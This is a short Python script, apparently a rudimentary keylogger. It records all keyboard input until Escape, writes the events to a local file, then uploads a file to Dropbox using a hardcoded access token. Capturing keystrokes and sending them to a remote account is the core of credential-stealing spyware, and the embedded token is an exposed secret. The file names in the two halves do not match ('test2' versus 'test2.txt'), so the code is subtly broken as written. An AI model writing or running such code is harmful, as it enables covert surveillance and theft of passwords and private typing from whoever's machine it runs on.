
import keyboard

with open('test2', 'r+') as file:
 events = keyboard.record(until="esc")
 for i in events:
    file.write(str(i))


import dropbox

db = dropbox.Dropbox('f-e8s_6DBjAAAAAAAAAAD9H3-dleMmv1AwiIPWsKRlFitP5S4sxq9Qq1lDVIl_DY')
fname = 'test2.txt'
dname = '/test2.txt'
f = open(fname, 'rb')
response = db.files_upload(f.read(), dname)
print('upload:', response)
f.close()
